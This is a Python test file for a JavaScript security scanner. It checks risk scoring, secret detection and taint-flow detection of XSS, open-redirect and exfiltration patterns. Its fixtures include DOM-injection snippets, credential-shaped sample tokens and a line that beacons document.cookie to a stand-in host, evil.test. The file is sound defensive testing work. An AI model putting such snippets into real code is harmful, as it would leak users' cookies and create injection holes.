"""Regression tests for detector precision and risk-scoring behaviour.

These cover the accuracy work that is easy to regress silently:

* the risk score must be driven by findings, not by inventory volume;
* secret detection must deduplicate, ignore vendor-name noise, and treat
  public-by-design client keys as inventory rather than credentials;
* the ``analyzers/*`` detectors must not fire on ordinary words;
* the taint fallback (used whenever the optional AST parser is unavailable)
  must still catch the canonical source-to-sink patterns.
"""

import os
import sys
import tempfile
import unittest

from core.js_patterns import (
    CRYPTO_MARKERS,
    DOM_SINK_PATTERNS,
    SOURCE_PATTERNS,
)
from core.scanner import _secret_context, scan_content
from core.taint import analyze_taint

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from analyzers import api_analyzer, crypto_analyzer, dom_analyzer, flow_analyzer, secret_analyzer
from core.risk_model import overall_risk
from core.scanner import _credible_secret, scan_file
from core.taint import analyze_taint


def scan(code):
    handle, path = tempfile.mkstemp(suffix=".js", prefix="scriptsentry_test_")
    with os.fdopen(handle, "w", encoding="utf-8") as fh:
        fh.write(code)
    try:
        return scan_file(path)
    finally:
        try:
            os.unlink(path)
        except OSError:
            pass


def _flow_ids(code):
    result = analyze_taint(code, filename="t.js")
    flows = result.get("flows") if isinstance(result, dict) else result
    return [f.get("id") for f in (flows or [])]


def _observation(n, start=0):
    return {
        "id": "api_surface_inventory",
        "severity": "LOW",
        "confidence": "low",
        "status": "informational",
        "evidence_type": "static_pattern",
        "observation": True,
        "file": "app.js",
        "line": start + n,
    }


def _injection(line=1, confidence="high", severity="HIGH"):
    return {
        "id": "dom_injection",
        "severity": severity,
        "confidence": confidence,
        "status": "open",
        "evidence_type": "source_to_sink",
        "observation": False,
        "file": "app.js",
        "line": line,
    }


class RiskScoreTest(unittest.TestCase):
    """The score answers "how risky", not "how much did we enumerate"."""

    def test_inventory_volume_alone_cannot_reach_high(self):
        many = [_observation(i) for i in range(200)]
        result = overall_risk(findings=many)
        self.assertLess(result["score"], 25)
        self.assertEqual(result["label"], "LOW")

    def test_observations_are_capped_as_a_bucket(self):
        few = overall_risk(findings=[_observation(i) for i in range(10)])
        many = overall_risk(findings=[_observation(i) for i in range(300)])
        self.assertLessEqual(many["score"], 20)
        self.assertLessEqual(many["counts"]["observation_points"],
                             many["counts"]["observation_cap"])

    def test_a_high_severity_flow_is_never_labelled_low(self):
        result = overall_risk(findings=[_injection(confidence="medium")])
        self.assertNotEqual(result["label"], "LOW")

    def test_findings_outweigh_a_large_inventory(self):
        many = [_observation(i) for i in range(150)]
        with_finding = overall_risk(findings=many + [_injection()])
        only_inventory = overall_risk(findings=many)
        self.assertGreater(with_finding["score"], only_inventory["score"])

    def test_demonstrated_effect_ranks_above_static_flow(self):
        static = overall_risk(findings=[_injection()])
        proven = overall_risk(findings=[_injection(confidence="confirmed")])
        self.assertGreater(proven["score"], static["score"])


class SecretDetectionTest(unittest.TestCase):
    def test_one_assignment_yields_one_finding(self):
        result = scan('const cfg = { apiKey: "AIzaSyD-abc123def456ghi789jkl012mno345p" };')
        # Previously three overlapping regexes produced three entries for the
        # same assignment, inflating the panel, the file score and risk.
        self.assertLessEqual(len(result["public_client_keys"]), 1)

    def test_vendor_names_alone_are_not_secrets(self):
        result = scan(
            'githubOrgName = "acme-corporation-limited";\n'
            'googleAnalyticsLoaded = true;\n'
            'desktopTheme = "dark";\n'
        )
        self.assertEqual(result["secrets"], [])
        self.assertEqual(result["credible_secrets"], [])

    def test_identity_fields_are_not_credentials(self):
        result = scan('user = "johndoe";\nemail = "a@b.com";\n')
        self.assertEqual(result["credible_secrets"], [])

    def test_public_client_keys_are_inventory_not_secrets(self):
        result = scan('const cfg = { apiKey: "AIzaSyD-abc123def456ghi789jkl012mno345p" };')
        self.assertEqual(result["credible_secrets"], [])
        self.assertTrue(result["public_client_keys"])

    def test_real_provider_credentials_are_detected_by_value_shape(self):
        result = scan(
            'const sk = "sk_live_51H8xQ2eZvKYlo2Cabcdefghij";\n'
            'const gh = "ghp_16C7e42F292c6912E7710c838347Ae178B4a";\n'
        )
        joined = " ".join(result["credible_secrets"]).lower()
        self.assertIn("sk_live_", joined)
        self.assertIn("ghp_", joined)

    def test_short_high_entropy_keys_are_still_credible(self):
        # The old rule required >= 16 characters and silently dropped these.
        self.assertTrue(_credible_secret('apiKey = "Ab3x9Kq1Zp7m"'))

    def test_webhook_urls_are_treated_as_credentials(self):
        result = scan('slack_webhook = "https://hooks.slack.com/services/T000/B000/XY12ABC34DEF";')
        self.assertTrue(result["credible_secrets"])

    def test_ordinary_asset_urls_are_not_secrets(self):
        result = scan('const bundle = "https://cdn.example.com/static/app.js";')
        self.assertEqual(result["credible_secrets"], [])


class AnalyzerPrecisionTest(unittest.TestCase):
    def test_crypto_keywords_do_not_match_inside_words(self):
        benign = "const el = document.querySelector('#desktop'); // aesthetics and design tokens"
        self.assertEqual(crypto_analyzer.analyze(benign), [])

    def test_real_crypto_is_still_detected(self):
        names = {f["name"] for f in crypto_analyzer.analyze("CryptoJS.AES.encrypt(m, key, { iv });")}
        self.assertIn("AES", names)
        self.assertIn("CryptoJS", names)

    def test_auth_required_is_decided_per_call(self):
        code = (
            '// check the authenticated user\n'
            'fetch("/api/v1/public/config");\n'
            'fetch("/admin/users", { headers: { Authorization: "Bearer " + t } });\n'
        )
        by_endpoint = {i["endpoint"]: i["auth_required"] for i in api_analyzer.analyze(code)}
        self.assertFalse(by_endpoint.get("/api/v1/public/config"))
        self.assertTrue(by_endpoint.get("/admin/users"))

    def test_dom_analyser_ignores_comments_and_plain_variables(self):
        self.assertNotIn("script_injection",
                         dom_analyzer.analyze("// load the script src from config"))
        self.assertNotIn("script_injection",
                         dom_analyzer.analyze("const script = getScript(); const src = buildUrl();"))

    def test_dom_analyser_detects_real_sinks(self):
        found = dom_analyzer.analyze("el.innerHTML = q; document.write(x); eval(y);")
        for sink in ("innerHTML", "document_write", "eval"):
            self.assertIn(sink, found)

    def test_secret_analyser_ignores_identity_fields(self):
        self.assertEqual(secret_analyzer.analyze('user: "johndoe"\nemail: "a@b.com"'), [])

    def test_flow_summary_is_structured(self):
        flow = flow_analyzer.analyze("fetch('/x'); localStorage.setItem('a', 1);")
        self.assertTrue(flow)
        self.assertTrue(all(isinstance(item, dict) and "stage" in item for item in flow))


class TaintFallbackTest(unittest.TestCase):
    """Canonical flows that must survive without the optional AST parser."""

    def test_query_string_to_inner_html(self):
        self.assertIn("dom_injection", _flow_ids(
            'const q = new URLSearchParams(location.search).get("q"); document.body.innerHTML = q;'))

    def test_referrer_to_document_write(self):
        self.assertIn("dom_injection", _flow_ids("document.write(document.referrer);"))

    def test_template_literal_sink(self):
        self.assertIn("dom_injection", _flow_ids("el.innerHTML = `<img src=${location.hash}>`;"))

    def test_jquery_html_sink(self):
        self.assertIn("dom_injection", _flow_ids("$('#out').html(location.hash);"))

    def test_open_redirect_through_assign(self):
        self.assertIn("open_redirect", _flow_ids(
            "location.assign(new URL(location.href).searchParams.get('next'));"))

    def test_set_attribute_redirect(self):
        # An href target is a redirect; a src/srcdoc target is an injection.
        ids = _flow_ids("a.setAttribute('href', location.hash);")
        self.assertTrue(set(ids) & {"open_redirect", "dom_injection"}, f"got {ids}")

    def test_cookie_to_beacon_is_flagged(self):
        # The AST path proves the flow (…_flow); the line fallback can only
        # nominate it as a candidate.  Either way this must not be silent.
        ids = _flow_ids("navigator.sendBeacon('https://evil.test/c', document.cookie);")
        self.assertTrue(any(str(i).startswith("data_exfiltration") for i in ids), f"got {ids}")

    def test_minified_single_line_is_understood(self):
        self.assertIn("dom_injection", _flow_ids(
            "!function(){var t=location.hash.substr(1);document.getElementById('o').innerHTML=t}();"))

    def test_sanitized_flow_is_not_an_action_item(self):
        flows = analyze_taint("el.innerHTML = DOMPurify.sanitize(location.hash);", filename="t.js")
        items = flows.get("flows") if isinstance(flows, dict) else flows
        self.assertTrue(items)
        self.assertTrue(all(f.get("sanitization_detected") for f in items))

    def test_benign_code_stays_silent(self):
        for code in (
            "el.innerHTML = '<b>hello</b>';",
            "if (a == b) { render(x); }",
            "this.title = document.title;",
            "const size = width * height;",
        ):
            self.assertEqual(_flow_ids(code), [], code)


if __name__ == "__main__":
    unittest.main()


class SharedCatalogueTest(unittest.TestCase):
    """Audit H12: one catalogue, imported -- never copied."""

    def test_taint_and_analyzers_share_one_catalogue(self):
        from analyzers import crypto_analyzer, dom_analyzer
        import core.taint as taint_module

        self.assertIs(dom_analyzer.SINK_PATTERNS, DOM_SINK_PATTERNS)
        self.assertIs(crypto_analyzer.CRYPTO_MARKERS, CRYPTO_MARKERS)
        self.assertIs(taint_module.SOURCE_PATTERNS, SOURCE_PATTERNS)

    def test_crypto_markers_are_word_bounded(self):
        # "DES" inside "desktopTheme" and "Hex" inside "hexagon" are not crypto.
        self.assertEqual(scan_content('const theme = "desktopTheme";').get("crypto"), [])
        self.assertEqual(scan_content("function hexagon() { return 1; }").get("crypto"), [])

    def test_real_crypto_is_still_reported(self):
        found = scan_content("CryptoJS.AES.encrypt(data, key);").get("crypto")
        self.assertTrue({"AES", "CryptoJS"}.issubset(set(found)))


class StorageSensitivityTest(unittest.TestCase):
    """Audit H15: sensitivity is a property of the value, not of the API."""

    def test_ordinary_storage_is_not_sensitive(self):
        self.assertFalse(scan_content('sessionStorage.setItem("theme", "dark");')["sensitive_storage"])

    def test_reading_a_cookie_is_not_sensitive(self):
        self.assertFalse(scan_content("const c = document.cookie;")["sensitive_storage"])

    def test_storing_a_token_is_sensitive(self):
        self.assertTrue(scan_content('localStorage.setItem("token", t);')["sensitive_storage"])

    def test_writing_a_token_cookie_is_sensitive(self):
        self.assertTrue(scan_content('document.cookie = "token=" + t;')["sensitive_storage"])


class SecretContextTest(unittest.TestCase):
    """Audit H14: content.find() result was used without checking for -1."""

    def test_missing_secret_has_no_context(self):
        # The old code returned content[0:180] -- the top of the file.
        self.assertEqual(_secret_context("var a = 1;", 'missing = "zzzzzz"'), "")

    def test_present_secret_has_surrounding_code(self):
        content = 'var a = 1; var apiKey = "Ab3x9Kq1Zp7m"; var b = 2;'
        context = _secret_context(content, 'apiKey = "Ab3x9Kq1Zp7m"')
        self.assertIn('apiKey', context)
        self.assertIn("Ab3x9Kq1Zp7m", context)


class ExtraSourceTest(unittest.TestCase):
    """Audit H13: sources that used to be invisible."""

    def _ids(self, code):
        result = analyze_taint(code)
        result = result if isinstance(result, dict) else {"findings": result}
        return [f.get("id") for f in result.get("findings", [])]

    def test_history_state_to_sink(self):
        self.assertIn("dom_injection", self._ids("const s = history.state; el.innerHTML = s;"))

    def test_document_base_uri_to_redirect(self):
        self.assertIn("open_redirect", self._ids("const u = document.baseURI; a.href = u;"))

    def test_element_href_redirect(self):
        self.assertIn("open_redirect", self._ids("const q = location.hash; link.href = q;"))

    def test_static_href_is_not_a_redirect(self):
        self.assertEqual(self._ids("link.href = '/about';"), [])
